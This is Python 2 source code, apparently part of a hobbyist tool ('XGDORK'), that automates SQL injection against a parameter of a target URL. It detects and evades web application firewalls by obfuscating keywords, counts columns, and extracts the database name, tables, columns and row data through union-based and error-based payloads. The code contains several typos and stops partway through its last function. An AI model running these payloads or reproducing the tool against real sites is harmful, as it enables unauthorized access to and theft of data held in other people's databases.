


import requests
from termcolor import colored
from XGDlib import block_cutter, ipuser, rand_agent



def     focpa (url, param):
        burl = ""
        i = 0
        ca = 0
        cb = 0
        tmp = ""

        while (i < len(url)):
            if (url[i] == '?' or url[i] == '&'):
                i += 1
                ca = i
                while (i < len(url) and url[i] != param[len(param)-1]):
                    i += 1
                cb = i
                tmp = block_cutter(url, ca, cb)
                if (tmp == param):
                    burl = block_cutter(url, 0, cb)

                    return burl
                else:
                    i = ca+1
            i += 1

        return -1



def     turing_range (nc_c, id_c, data):
        ndata = ""
        i = 1
        while (i <= nc_c):
            if (i == nc_c):
                if (data != '' and i == id_c):
                    ndata += str(data)
                else:
                    ndata += str(i)
            else:
                if (data != '' and i== id_c):
                    ndata += str(data)+","
                else:
                    ndata += str(i)+","
            i += 1

        return ndata



def     turing_fields (fields):
        ndata = ""
        i = 0
        while (i < len(fields)):
            if (i == len(fields)-1):
                ndata += "0x7c,"+fields[i]
            else:
                ndata += "0x7c,"+fields[i]+",0x7c,0x3e,"
            i += 1

        return ndata



def     turing_heur (size):
        ndata = ""
        i = 0

        while (i <= size):
            if (i == size):
                ndata += "CHAR(088,071,068,079,082,075,013,010)"
            else:
                ndata += "CHAR(088,071,068,079,082,075,013,010),"
            i += 1

        return ndata


def     sbws (string):
       
        string = string.replace(" ", "+")
        string = string.replace("UNION", "/*!50000UnIoN*/")
        string = string.replace("ORDER", "/*!50000OrDeR*/")
        string = string.replace("GROUP_CONCAT", "/*!50000GrOuP_CoNcAt*/")
        string = string.replace("CONCAT", "/*!50000CoNcAt*/")
        string = string.replace("CHAR", "/*!50000ChAr*/")
        string = string.replace("FROM", "/*!50000FrOm*/")
        string = string.replace("WHERE", "/*!50000WhErE*/")
        string = string.replace("RAND", "/*!50000RaNd*/")
        string = string.replace("FLOOR", "/*!50000FlOoR*/")
        string = string.replace("HEX", "/*!50000HeX*/")
        string = string.replace("UNHEX", "/*!50000UnHeX*/")
        string = string.replace("LIMIT", "/*!50000LiMiT*/")
        string = string.replace("ELT", "/*!50000ElT*/")
        string = string.replace("SLEEP", "/*!50000SlEeP*/")
        string = string.replace("SELECT", "/*!50000SeLeCt*/")
        string = string.replace("COUNT", "/*!50000CoUnT*/")
        string = string.replace("@@version", "/*!50000@@VeRsIoN*/")
        string = string.replace("version()", "/*!50000VeRsIoN()*/")
        string = string.replace("database()", "/*!50000DaTaBaSe()*/")
        string = string.replace("TABLE_NAME", "/*!50000TaBlE_NaMe*/")
        string = string.replace("COLUMN_NAME", "/*!50000CoLuMn_NaMe*/")
        string = string.replace("INFORMATION_SCHEMA.TABLES", "/*!50000InFoRmAtIoN_ScHeMa.TaBlEs*/")
        string = string.replace("INFORMATION_SCHEMA.COLUMNS", "/*!50000InFoRmAtIoN_ScHeMa.CoLuMnS*/")
        string = string.replace("INFORMATION_SCHEMA.PLUGINS", "/*!50000InFoRmAtIoN_ScHeMa.PlUgInS*/")
        string = string.replace("TABLE_SCHEMA", "/*!50000TaBlE_ScHeMa*/")
        string = string.replace("GROUP", "/*!50000GrOuP*")
        string = string.replace("LIKE", "/*!50000LiKe*/")
        string = string.replace("BY", "/*!50000By*/")
        string = string.replace("CONCAT_WS", "/*!50000CoNcAt_Ws*/")
        string = string.replace("HAVING", "/*!50000HaViNg*/")
        string = string.replace("MIN", "/*!50000MiN*/")
        string = string.replace("CAST", "/*!50000CaSt*/")
        string = string.replace("AS", "/*!50000As*/")
        string = string.replace("CHAR", "/*!50000ChAr*/")
        string = string.replace("AND", "/*!50000AnD*/")
        string = string.replace("OR", "/*!50000Or*/")

        return string


def     stress_url (url, param):
        burl = ""
        nurl = ""
        data = ""
        waf = 0
        result = []
        burl = focpa(url, param)

        user_agent = rand_agent()
        headers = {'User-Agent': user_agent}
        print colored(" [+] User-Agent: "+user_agent, 'green')
        print colored(" [*] Stress URL ... ", 'green')
        nurl = burl
        nurl += "1984 AND CONCAT(CHAR(088,071,068,079,082,075,013,010))"
        #print (nurl)

        r = requests.get(nurl, headers=headers)
        data = r.text.encode('utf-8')

        if (data.find("Mod_Security") > -1 or data.find("You don't have permission ") > -1):
            print colored(" [!] WAF Detected ! ", 'red')
            waf = 1
        

        nurl = burl
        nurl += "-300 UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113,114,115,116,117,118,119,120,121,122,123,124,125,126,127,128,129,130,131,132,133,134,135,136,137,138,139,140,141,142,143,144,145,146,147,148,149,150,151,152,153,154,database(),156,157,158,159,160,161,162,163,164,165,166,167,168,169,170,171,172,173,174,175,176,177,178,179,180,181,182,183,184,185,186,187,188,189,190,191,192,193,194,195,196,197,198,199,200,201,202,203,204,205,206,207,208,209,210,211,212,213,214,215,216,217,218,219,220,221,222,223,224,225,226,227,228,229,230,231,232,233,234,235,236,237,238,239,240,241,242,243,244,245,246,247,248,249,250,251,252,253,254,255,256,257,258,259,260,261,262,263,264,265,266,267,268,269,270,271,272,273,274,275,276,277,278,279,280,281,282,283,284,285,286,287,288,289,290,291,292,293,294,295,296,297,298,299,300 --"
        if (waf == 1):
            nurl = sbws(nurl)

        #print (nurl)
        r = requests.get(nurl, headers=headers)
        data = r.text.encode('utf-8')

        if (data.find('The used SELECT statements ') > -1):
            print colored(" [!] ERROR-BASED FOUND !", 'green')
            if (waf == 1):
                result.append(1)
            else:
                result.append(0)

            result.append(2)
            return result

        else:
            nurl = burl
            nurl += "777 ORDER BY 777 --"
            if (waf == 1):
                nurl = sbws(nurl)
            
            #print (nurl)
            r = requests.get(nurl, headers=headers)
            data = r.text.encode('utf-8')

            if (data.find("Unknown column '") > -1 and data.find("' in 'order clause'") > -1 or data.find('mysql_num_rows():') > -1 or data.find('mysql_num_row():') > -1):
                print colored(" [!] UNION-BASED FOUND !", 'green')
                if (waf == 1):
                    result.append(1)
                else:
                    result.append(0)
                
                result.append(1)
                return result

            else:
                print colored(" [*] TEST HEURISTIC-UNION ...", 'green')
                if (waf == 1):
                    result.append(1)
                else:
                    result.append(0)

                result.append(3)
                return result




def     heuristic_nc (url, param, waf):
        burl = ""
        nurl = ""
        i = 0
        ids_inject = []
        rangestr = ""
        data = ""

        user_agent = rand_agent()
        headers = {'User-Agent': user_agent}
        print colored(" [+] User-Agent: "+user_agent, 'green')

        burl = focpa(url, param)
    
        print colored(" [*] COUNT, can take a while, wait ...", 'cyan')
        while (i <= 55):
            nurl = burl
            rangestr = turing_heur(i)
            
            nurl += "-1984 UNION SELECT "+rangestr+" --"
            if (waf == 1):
                nurl = sbws(nurl)
            
            #print (nurl)
            if (i == 1):
                print colored("- 1 to 10 ", 'cyan')
            if (i == 11):
                print colored("- 10 to 20 ", 'cyan')
            if (i == 21):
                print colored("- 20 to 30 ", 'cyan')
            if (i == 31):
                print colored("- 30 to 40 ", 'cyan')
            if (i == 41):
                print colored("- 40 to 55 ", 'cyan')

            r = requests.get(nurl, headers=headers)
            data = r.text.encode('utf-8')

            if (data.find('XGDORK') > -1):
                print colored(" [!] URL appears as injectable ...", 'green')
                return i+1

            i += 1

        print colored(" [!] Heuristic nc failed ", 'red')
        print colored(" [*] Try Manually (it's more Fun and Education) or use SQLmap (it's eZ')", 'red')
        exit(0)
   


def     count_nc (url, param, waf):
        burl = ""
        nurl = ""
        i = 1

        user_agent = rand_agent()
        headers = {'User-Agent': user_agent}
        print colored(" [+] User-Agent: "+user_agent, 'green')

        burl = focpa(url, param)

        print colored(" [*] COUNT, Can take a while, wait ...", 'cyan')
        while (i <= 55):
            nurl = burl
            nurl += str(i)+" ORDER BY "+str(i)+" --"
            if (waf == 1):
                nurl = sbws(nurl)

            #print (nurl)
            if (i == 1):
                print colored("- 1 to 10 ", 'cyan')
            if (i == 11):
                print colored("- 10 to 20 ", 'cyan')
            if (i == 21):
                print colored("- 20 to 30 ", 'cyan')
            if (i == 31):
                print colored("- 30 to 40 ", 'cyan')
            if (i == 41):
                print colored("- 40 to 55 ", 'cyan')

            r = requests.get(nurl, headers=headers)
            data = r.text.encode('utf-8')

            if (data.find("Unknown column '") > -1 and data.find("' in 'order clause'") > -1 or data.find('mysql_num_rows():') > -1 or data.find('mysql_num_row():') > -1):
                #print ("DEBUG ERROR FOUND: "+str(i))
                print colored(" [+] URL appears as injectable ...", 'green')
                return (i-1)

            i += 1

        print colored(" [!] Count nc failed ", 'red')
        print colored(" [*] Try Manually (it's more Fun and Education) or use SQLmap (it's eZ')", 'red')
        exit(0)



def     id_checker (url, param, waf, nc):
        burl = ""
        nurl = ""
        data = ""
        rangestr = ""
        i = 0

        user_agent = rand_agent()
        headers = {'User-Agent': user_agent}
        print colored(" [+] User-Agent: "+user_agent, 'green')

        burl = focpa(url, param)

        while (i <= nc):
            nurl = burl
            rangestr = turing_range(nc, i, "CHAR(088,071,068,079,082,075,013,010)")
            nurl += "-1984 UNION SELECT "+rangestr+" --"
            if (waf == 1):
                nurl = sbws(nurl)

            #print (nurl)
            r = requests.get(nurl, headers=headers)
            data = r.text.encode('utf-8')

            if (data.find('XGDORK') > -1):
                #print ("ID Injectable: "+str(i))
                return i

            i += 1

        print colored(" [!] Id checker failed ", 'red')
        print colored(" [*] Try Manually (it's more Fun and Education) or use SQLmap (it's eZ')", 'red')
        exit(0)

        

def     parserDump (data, mod):
        i = 0
        ca = 0
        cb = 0
        data_list = []

        while (i < len(data)-1):
            if (data[i] == '(' and data[i+1] == '^' and data[i+2] == '#'):
                i += 5
                ca = i
                while (i < len(data)-2 and (data[i] != '(' and data[i+2] != '#')):
                    if (i == data.find("' for key")):
                        break
                    if (data[i] == '<'):
                        break
                    i += 1
                i -= 1
                cb = i
                tmp = block_cutter(data, ca, cb)
                data_list.append(tmp)

                print colored(" "+tmp, 'yellow')
                if (mod == 1):
                    return data_list
            i += 1

        return data_list



def     parserDump_b (data, limiter):
    i = 0
    ca = 0
    cb = 0
    tmp = ""
    data_list = []

    while (i < len(data)-1):
        if (data.find("Duplicate entry") > -1):
            i = data.find("Duplicate entry")
            ca = i
            while (i < len(data)-1 and data[i] != "'"):
                i += 1
                cb = i
                tmp = block_cutter(data, ca, cb)
                if (tmp == "Duplicate entry '" or tmp == "duplicate entry '" or tmp == ">Duplicate entry '" or tmp == ">duplicate entry '"):

                    i += 1
                    ca = i
                    while (i < len(data)-1 and data[i] != limiter):
                        i += 1
                    cb = i
                    tmp = block_cutter(data, ca, cb-1)
                    data_list.append(tmp)
                    print colored(" "+tmp, 'yellow')

                    #return data_list
                    return tmp
            i += 1




def     dumpDatabase (url, param, waf, modx, nc, idx):
        burl = ""
        nurl = ""
        data = ""
        rangestr = ""
        database_list = []
        tmpfile = file

        user_agent = rand_agent()
        headers = {'User-Agent': user_agent}
        print colored(" [+] User-Agent: "+user_agent, 'green')

        burl = focpa(url, param)

        if (modx == 1):
            nurl = burl
            rangestr = turing_range(nc, idx, "GROUP_CONCAT(CHAR(040,094,035,094,041),@@version,database(),CHAR(040,118,035,118,041))")
            nurl += "-1984 UNION SELECT "+rangestr+" --"
            if (waf == 1):
                nurl = sbws(nurl)
            #print (nurl)
            
            r = requests.get(nurl, headers=headers)
            data = r.text.encode('utf-8')

            if (data.find("(V#V)") == -1 and data.find("(^#^)") == -1):
                print colored(" [*] Change syntax ... ", 'cyan')
                nurl = burl
                rangestr = turing_range(nc, idx, "CONCAT(CHAR(040,094,035,094,041),@@version,database(),CHAR(040,118,035,118,041))")
                nurl += "-1984 UNION SELECT "+rangestr+" --"
                if (waf == 1):
                    nurl = sbws(nurl)
                #print (nurl)     
                r = requests.get(nurl, headers=headers)
                data = r.text.encode('utf-8')

                database_list = parserDump(data, 1)
            else:
                database_list = parserDump(data, 1)

            if (len(database_list) > 0):
                print colored(" [+] URL is injectable", 'green')
                print (str(database_list))

                tmpfile = open("tmpfile", 'w')
                tmpfile.write(str(modx)+"\n")
                tmpfile.write(str(waf)+"\n")
                tmpfile.write(database_list[0]+"\n")
                tmpfile.write(str(nc)+"\n")
                tmpfile.write(str(idx)+"\n")
                tmpfile.close()

                return database_list
            else:
                print colored(" [-] Injection attempt failed ", 'red')
                print colored(" [*] Try Manually (it's more Fun and Education) or use SQLmap (it's eZ')", 'red')
                exit(0)


        elif (modx == 2):
            nurl = burl
            nurl += "1 OR 1984 GROUP BY CONCAT(0x28,0x5e,0x23,0x5e,0x29,version(),0x28,0x56,0x23,0x56,0x29,floor(rand(0)*2)) HAVING MIN(0) OR 1 --"
            if (waf == 1):
                nurl = sbws(nurl)
            #print (nurl)
            r = requests.get(nurl, headers=headers)
            data = r.text.encode('utf-8')

            if (data.find("(^#^)") == -1):
                print colored(" [*] Change syntax ... ", 'cyan')
                nurl = burl
                nurl += "1 OR (SELECT 1984 FROM (SELECT COUNT(*),CONCAT(0x28,0x5e,0x23,0x5e,0x29,version(),0x28,0x56,0x23,0x56,0x29,(SELECT(ELT(1984=1984,1))),FL0OR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) --"
                if (waf == 1):
                    nurl = sbws(nurl)
                #print (nurl)
                r = requests.get(nurl, headers=headers)
                data = r.text.encode('utf-8')
                if (data.find("(^#^)") == -1):
                    print colored(" [*] Change syntax ... ", 'cyan')
                    nurl = burl
                    nurl += "1 OR (SELECT 1984 FROM (SELECT COUNT(*),CONCAT(0x28,0x5e,0x23,0x5e,0x29,version(),0x28,0x56,0x23,0x56,0x29,CEILING(RAND(0)*CONVERT(2,BINARY)))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) --"
                    if (waf == 1):
                        nurl = sbws(nurl)
                    #print (nurl)
                    r = requests.get(nurl, headers==headers)
                    data = r.text.encode('utf-8')

                    tmp = str(parserDump(data, 1))
                    tmp = tmp.replace('[', '').replace(']', '').replace("'", '')

                else:
                    tmp = str(parserDump(data, 1))
                    tmp = tmp.replace('[', '').replace(']', '').replace("'", '')
            else:
                tmp = str(parserDump(data, 1))
                tmp = tmp.replace('[', '').replace(']', '').replace("'", '')

            if (tmp != ''):
                print colored(" [+] URL appears as injectable ...", 'green')
                database_list.append(tmp)
                nurl = burl
                nurl += "1 AND (SELECT 1984 FROM (SELECT COUNT(*),CONCAT((SELECT(SELECT CONCAT(0x28,0x5e,0x23,0x5e,0x29,CAST(database() AS CHAR),0x28,0x56,0x23,0x56,0x29)) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=database() LIMIT 0,1),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a) --"
                if (waf == 1):
                    nurl = sbws(nurl)
                #print (nurl)
                r = requests.get(nurl, headers=headers)
                data = r.text.encode('utf-8')
                if (data.find("(^#^)") == -1):
                    print colored(" [*] Change syntax ... ", 'cyan')
                    nurl = burl
                    nurl += "1 OR (SELECT 1984 FROM (SELECT COUNT(*),CONCAT(0x28,0x5e,0x23,0x5e,0x29,database(),0x28,0x56,0x23,0x56,0x29,(SELECT(ELT(1984=1984,1))),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) --"
                    if (waf == 1):
                        nurl = sbws(nurl)
                    #print (nurl)
                    r = requests.get(nurl, headers=headers)
                    data = r.text.encode('utf-8')
                    if (data.find("(^#^)") == -1):
                        print colored(" [*] Change syntax ... ", 'cyan')
                        nurl = burl
                        nurl += "1 OR (SELECT 1984 FROM (SELECT COUNT(*),CONCAT(0x28,0x5e,0x23,0x5e,0x29,database(),0x28,0x56,0x23,0x56,0x29,CEILING(RAND(0)*CONVERT(2,BINARY)))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) --"
                        if (waf == 1):
                            nurl = sbws(nul)
                        #print (nurl)
                        r = requests.get(nurl, headers=headers)
                        data = r.text.encode('utf-8')
                    
                        tmp = str(parserDump(data, 1))
                        tmp = tmp.replace('[', '').replace(']', '').replace("'", '')

                    else:
                        tmp = str(parserDump(data, 1))
                        tmp = tmp.replace('[', '').replace(']', '').replace("'", '')

                else:
                    tmp = str(parserDump(data, 1))
                    tmp = tmp.replace('[', '').replace(']', '').replace("'", '')

                if (tmp != ''):
                    database_list.append(tmp)
                else:
                    print colored(" [-] Injection attempt failed ", 'red')
                    print colored(" [*] Try Manually (it's more Fun and Education) or use SQLmap (it's eZ')", 'red')
                    exit(0)
            else:
                print colored(" [-] Injection attempt failed ", 'red')
                print colored(" [*] Try Manually (it's more Fun and Education) or use SQLmap (it's eZ')", 'red')
                exit(0)

            if (len(database_list) > 1):
                print colored(" [+] URL is injectable", 'green')
                print (str(database_list))
                tmpfile = open("tmpfile", 'w')
                tmpfile.write(str(modx)+"\n")
                tmpfile.write(str(waf)+"\n")
                tmpfile.write(str(database_list[1])+"\n")
                tmpfile.write(str(nc)+"\n")
                tmpfile.write(str(idx)+"\n")
                tmpfile.close()

                return database_list
            else:
                print colored(" [-] Injection attempt failed ", 'red')
                print colored(" [*] Try Manually (it's more Fun and Education) or use SQLmap (it's eZ')", 'red')
                exit(0)



def     dumpTables (url, param, waf, modx, nc, idx):
        burl = ""
        nurl = ""
        data = ""
        rangestr = ""
        tmp = ""
        stress = 0
        error_syntax = 0
        i = 0
        tables_list = []

        user_agent = rand_agent()
        headers = {'User-Agent': user_agent}
        print colored(" [+] User-Agent: "+user_agent, 'green')

        burl = focpa(url, param)

        if (modx == 1):
            nurl = burl
            rangestr = turing_range(nc, idx, "GROUP_CONCAT(CHAR(040,094,035,094,041),TABLE_NAME,CHAR(040,118,035,118,041))")
            nurl += "-1984 UNION SELECT "+rangestr+" FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=database() --"
            if (waf == 1):
                nurl = sbws(nurl)
            #print (nurl)
            r = requests.get(nurl, headers=headers)
            data = r.text.encode('utf-8')
            if (data.find("(V#V)") == -1 and data.find("(^#^)") == -1):
                print colored(" [*] Change syntax ... ", 'cyan')
                rangestr = turing_range(nc, idx, "CONCAT(CHAR(040,094,035,094,041),TABLE_NAME,CHAR(040,118,035,118,041))")
                while (stress == 0):
                    nurl = burl
                    nurl += "-1984 UNION SELECT "+rangestr+" FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA LIKE database() LIMIT "+str(i)+",1 --"
                    if (waf == 1):
                        nurl = sbws(nurl)
                    #print(nurl)

                    r = requests.get(nurl, headers=headers)
                    data = r.text.encode('utf-8')

                    if (data.find("(V#V)") == -1 and data.find("(^#^)") == -1):
                        stress = 1

                    tmp = str(parserDump(data, 1))
                    tmp = tmp.replace('[', '').replace(']', '').replace("'", '')
                    if (tmp != ''):
                        tables_list.append(tmp)

                    i += 1
            else:
                tables_list = parserDump(data, 0)

            if (len(tables_list) > 0):
                print (str(tables_list))
                return tables_list
            else:
                print colored(" [-] Injection attempt failed ", 'red')
                print colored(" [*] Try Manually (it's more Fun and Education) or use SQLmap (it's eZ')", 'red')
                exit(0)

        elif (modx == 2):
            while (stress == 0):
                nurl = burl
                if (error_syntax == 0):
                    nurl += "1 AND (SELECT 1984 FROM (SELECT COUNT(*),CONCAT((SELECT(SELECT CONCAT(0x28,0x5e,0x23,0x5e,0x29,CAST(TABLE_NAME AS CHAR),0x28,0x56,0x23,0x56,0x29)) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=database() LIMIT "+str(i)+",1),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a) --"
                elif (error_syntax == 1):
                    nurl += "1 OR (SELECT 1984 FROM (SELECT COUNT(*), CONCAT((SELECT CONCAT(0x28,0x5e,0x23,0x5e,0x29,TABLE_NAME,0x28,0x56,0x23,0x56,0x29) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=database() LIMIT "+str(i)+",1),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) --"
                elif (error_syntax == 2):
                    nurl += "1 OR (SELECT 1984 FROM (SELECT COUNT(*), CONCAT((SELECT CONCAT(0x28,0x5e,0x23,0x5e,0x29,TABLE_NAME,0x28,0x56,0x23,0x56,0x29) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA LIKE database() LIMIT "+str(i)+",1),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) --"

                if (waf == 1):
                    nurl = sbws(nurl)
                #print (nurl)
                r = requests.get(nurl, headers=headers)
                data = r.text.encode('utf-8')

                if (data.find("You have an error in your SQL syntax;") > -1 or data.find("Subquery returns more than 1 row") > -1 or data.find("this is incompatible ") > -1 or data.find("Nothing found!") > -1 or data.find("not found") > -1 and data.find("(^#^)") == -1):
                    print colored(" [*] Change syntax ... ", 'cyan')
                    error_syntax += 1
                    i = 0
                else:
                    tmp = str(parserDump(data, 1))
                    tmp = tmp.replace('[', '').replace(']', '').replace("'", '')
                    if (tmp != ''):
                        tables_list.append(tmp)
                    else:
                        stress = 1

                i += 1

            if (len(tables_list) > 0):
                print (str(tables_list))
                return tables_list
            else:
                print colored(" [-] Injection attempt failed ", 'red')
                print colored(" [*] Try Manually (it's more Fun and Education) or use SQLmap (it's eZ')", 'red')
                exit(0)



def     dumpColumns (url, param, waf, modx, nc, idx, table):
        burl = ""
        nurl = ""
        data = ""
        tmp = ""
        rangestr = ""
        stress = 0
        error_syntax = 0
        i = 0
        columns_list = []

        user_agent = rand_agent()
        headers = {'User-Agent': user_agent}
        print colored(" [+] User-Agent: "+user_agent, 'green')


        burl = focpa(url, param)

        if (modx == 1):
            nurl = burl
            rangestr = turing_range(nc, idx, "GROUP_CONCAT(CHAR(040,094,035,094,041),COLUMN_NAME,CHAR(040,118,035,118,041))")
            nurl += "-1984 UNION SELECT "+rangestr+" FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA=database() AND TABLE_NAME='"+table+"' --"
            if (waf == 1):
                nurl = sbws(nurl)
            #print (nurl)

            r = requests.get(nurl, headers=headers)
            data = r.text.encode('utf-8')
            
            if (data.find("(V#V)") == -1 and data.find("(^#^)") == -1):
                print colored(" [*] Change syntax ... ", 'cyan')
                nurl = burl
                nurl += "-1984 UNION SELECT "+rangestr+" FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA=database() AND TABLE_NAME LIKE 0x"+str(table).encode('hex')+" --"
                if (waf == 1):
                    nurl = sbws(nurl)
                #print (nurl)
                r = requests.get(nurl, headers=headers)
                data = r.text.encode('utf-8')
                if (data.find("(V#V)") == -1 and data.find("(^#^)") == -1):
                    print colored(" [*] Change syntax ... ", 'cyan')
                    rangestr = turing_range(nc, idx, "CONCAT(CHAR(040,094,035,094,041),COLUMN_NAME,CHAR(040,118,035,118,041))")
                    while (stress == 0):
                        nurl = burl
                        nurl += "-1984 UNION SELECT "+rangestr+" FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA=database() AND TABLE_NAME LIKE 0x"+str(table).encode('hex')+" LIMIT "+str(i)+",1 --"
                        if (waf == 1):
                            nurl = sbws(nurl)
                        #print (nurl)
                        r = requests.get(nurl, headers=headers)
                        data = r.text.encode('utf-8')
                        if (data.find("(V#V)") == -1 and data.find("(^#^)") == -1):
                            stress = 1

                        tmp = str(parserDump(data, 1))
                        tmp = tmp.replace('[', '').replace(']', '').replace("'", '')
                        if (tmp != ''):
                            columns_list.append(tmp)

                        i += 1

                else:
                    columns_list = parserDump(data, 0)

            else:
                columns_list = parserDump(data, 0)

            if (len(columns_list) > 0):
                print (str(columns_list))
                return columns_list
            else:
                print colored(" [-] Injection attempt failed ", 'red')
                print colored(" [*] Try Manually (it's more Fun and Education) or use SQLmap (it's eZ')", 'red')
                exit(0)


        elif (modx == 2):
            while (stress == 0):
                nurl = burl
                if (error_syntax == 0):
                    nurl += "1 AND (SELECT 1984 FROM (SELECT COUNT(*),CONCAT((SELECT(SELECT CONCAT(0x28,0x5e,0x23,0x5e,0x29,CAST(COLUMN_NAME AS CHAR),0x28,0x56,0x23,0x56,0x29)) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME=0x"+table.encode('hex')+" LIMIT "+str(i)+",1),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a) --"
                elif (error_syntax == 1):
                    nurl += "1 OR (SELECT 1984 FROM (SELECT COUNT(*),CONCAT((SELECT CONCAT(0x28,0x5e,0x23,0x5e,0x29,COLUMN_NAME,0x28,0x56,0x23,0x56,0x29) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA=database() AND TABLE_NAME=0x"+table.encode('hex')+" LIMIT "+str(i)+",1),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) --"
                elif (error_syntax == 2):
                    nurl += "1 OR (SELECT 1984 FROM (SELECT COUNT(*),CONCAT((SELECT CONCAT(0x28,0x5e,0x23,0x5e,0x29,COLUMN_NAME,0x28,0x56,0x23,0x56,0x29) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA LIKE database() AND TABLE_NAME=0x"+table.encode('hex')+" LIMIT "+str(i)+",1),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) --"

                if (waf == 1):
                    nurl = sbws(nurl)
                #print (nurl)
                r = requests.get(nurl, headers=headers)
                data = r.text.encode('utf-8')

                if (data.find("You have an error in your SQL syntax;") > -1 or data.find("Subquery returns more than 1 row") > -1 or data.find("this is incompatible ") > -1 or data.find("Nothing found!") > -1 or data.find("not found") > -1 and data.find("(^#^)") == -1):
                    print colored(" [*] Change syntax ... ", 'cyan')
                    error_syntax += 1
                    i = 0
                else:
                    tmp = str(parserDump(data, 1))
                    tmp = tmp.replace('[', '').replace(']', '').replace("'", '')
                    if (tmp != ''):
                        columns_list.append(tmp)
                    else:
                        stress = 1

                i += 1

            if (len(columns_list) > 0):
                print (str(columns_list))
                return columns_list
            else:
                print colored(" [-] Injection attempt failed ", 'red')
                print colored(" [*] Try Manually (it's more Fun and Education) or use SQLmap (it's eZ')", 'red')
                exit(0)




def     dumpData_s (url, param, waf, modx, nc, idx, table, fields, dbx):
        burl = ""
        nurl = ""
        data = ""
        tmp = ""
        tmp_l = ""
        rangestr = ""
        stress = 0
        error_syntax = 0
        i = 0
        j = 0
        data_s_list = []


        user_agent = rand_agent()
        headers = {'User-Agent': user_agent}
        print colored(" [+] User-Agent: "+user_agent, 'green')

        burl = focpa(url, param)

        if (modx == 1):
            nurl = burl
            insertFields = turing_fields(fields)
            rangestr = turing_range(nc, idx, "GROUP_CONCAT(CHAR(040,094,035,094,041),"+str(insertFields)+",CHAR(040,118,035,118,041))")
            nurl += "-1984 UNION SELECT "+rangestr+" FROM '"+table+"' --"
            if (waf == 1):
                nurl = sbws(nurl)
            #print (nurl)
            r = requests.get(nurl, headers=headers)
            data = r.text.encode('utf-8')
            if (data.find("(V#V)") == -1 and data.find("(^#^)") == -1):
                print colored(" [*] Change syntax ... ", 'cyan')
                nurl = burl
                nurl += "-1984 UNION SELECT "+rangestr+" FROM 0x"+str(table.encode('hex'))+" --"
                if (waf == 1):
                    nurl = sbws(nurl)
                #print (nurl)
                r = requests.get(nurl, headers=headers)
                data = r.text.encode('utf-8')
                if (data.find("(V#V)") == -1 and data.find("(^#^)") == -1):
                    print colored(" [*] Change syntax ... ", 'cyan')
                    while (stress == 0):
                        nurl = burl
                        j = 0
                        while (j < len(fields) and stress == 0):
                            nurl = burl
                            rangestr = turing_range(nc, idx, "CONCAT(CHAR(040,094,035,094,041),"+str(fields[j])+",CHAR(040,118,035,118,041))")
                            nurl += "-1984 UNION SELECT "+rangestr+" FROM "+table+" LIMIT "+str(i)+",1 --"
                            if (waf == 1):
                                nurl = sbws(nurl)
                            #print (nurl)
                            r = requests.get(nurl, headers=headers)
                            data = r.text.encode('utf-8')

                            tmp = str(parserDump(data, 1))
                            tmp = tmp.replace('[', '').replace(']', '').replace("'", '')
                            if (tmp != ''):
                                tmp_l += " "
                                tmp_l += tmp

                            j += 1

                        if (data.find("(V#V)") == -1 and data.find("(^#^)") == -1):
                                stress = 1

                        if (tmp_l != ''):
                            data_s_list.append(tmp_l)

                        i += 1
                else:
                    data_s_list = parserDump(data, 0)
            else:
                data_s_list = parserDump(data, 0)

            if (len(data_s_list) > 0):
                print (str(data_s_list))
                return data_s_list
            else:
                print colored(" [-] Injection attempt failed ", 'red')
                print colored(" [*] Try Manually (it's more Fun and Education) or use SQLmap (it's eZ')", 'red')
                exit(0)

        elif (modx == 2):
            insertFields = turing_fields(fields)
            while (stress == 0):
                nurl = burl
                if (error_syntax == 0):
                    nurl += "1 AND (SELECT 1984 FROM (SELECT COUNT(*),CONCAT((SELECT(SELECT CONCAT(CAST(0x28,0x5e,0x23,0x5e,0x29,CONCAT("+str(insertFields)+") AS CHAR),0x28,0x56,0x23,0x56,0x29)) FROM "+str(dbx)+"."+str(table)+" LIMIT "+str(i)+",1),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a) --" 
                if (waf == 1):
                    nurl = sbws(nurl)
                #print (nurl)
                r = requests.get(nurl, headers=headers)
                data = r.text.encode('utf-8')
                if (data.find("You have an error in your SQL syntax;") > -1 or data.find("Subquery returns more than 1 row") > -1 or data.find("this is incompatible ") > -1 or data.find("Nothing found!") > -1 or data.din("Not found") > -1 and data.find("(^#^)") == -1):
                    stress = 1
                    error_syntax += 1
